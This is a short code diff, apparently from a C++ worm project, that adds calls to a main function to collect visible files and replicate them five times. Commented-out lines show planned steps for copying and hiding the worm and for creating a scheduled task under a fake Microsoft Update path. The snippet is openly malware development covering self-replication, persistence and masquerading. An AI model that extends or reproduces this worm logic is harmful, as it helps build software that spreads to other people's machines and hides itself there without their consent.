@@ -11,6 +11,11 @@ int main() {
 
 	worm1.search_list_dir();
 	worm1.print_list_dir();
+	worm1.collect_visible_files();
+
+	worm1.print_file_to_copy();
+
+	worm1.replicate_files(5);
 	//worm1.copy_and_hide_worm();
 	//worm1.create_scheduled_task(L"%APPDATA%\\Microsoft\\Update\\update.exe");
 	//worm1.copy_file();
